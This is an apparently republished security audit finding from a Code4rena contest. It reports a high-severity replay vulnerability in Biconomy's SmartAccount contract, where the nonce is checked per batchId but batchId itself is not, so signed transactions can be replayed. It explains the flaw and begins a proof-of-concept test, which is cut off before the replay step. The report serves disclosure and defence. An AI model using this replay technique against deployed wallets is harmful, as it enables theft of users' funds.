# [H] Replay attack (EIP712 signed transaction)

## Summary
Severity: High
Chain: Smart contract
Component: 2023-01-biconomy
Published: 2023-01-05
Source: https://github.com/code-423n4/2023-01-biconomy-findings/issues/36
Type: code-finding

## Details
# Lines of code

https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L212


# Vulnerability details

## Impact
Signed transaction can be replayed. First user transaction can always be replayed any amount of times. With non-first transactions attack surface is reduced but never dissapears

## Why it possible
Contract checks `nonces[batchId]` but not `batchId` itself, so we could reuse other batches nounces. If before transaction we have `n` batches with the same nonce as transaction batch, then transaction can be replayed `n` times. Since there are 2^256 `batchId`s with nonce = 0, first transaction in any batch can be replayed as much times as attacker needs.

## Proof of Concept
Insert this test in `testGroup1.ts` right after `Should set the correct states on proxy` test:

    it("replay EIP712 sign transaction", async function () {
      await token
      .connect(accounts[0])
      .transfer(userSCW.address, ethers.utils.parseEther("100"));

    const safeTx: SafeTransaction = buildSafeTransaction({
      to: token.address,
      data: encodeTransfer(charlie, ethers.utils.parseEther("10").toString()),
      nonce: await userSCW.getNonce(0),
    });

    const chainId = await userSCW.getChainId();
    const { signer, data } = await safeSignTypedData(
      accounts[0],
      userSCW,
      safeTx,
      chainId
    );

    const transaction: Transaction = {
      to: safeTx.to,
      value: safeTx.value,

_Trimmed to 38 lines — full report: https://github.com/code-423n4/2023-01-biconomy-findings/issues/36_
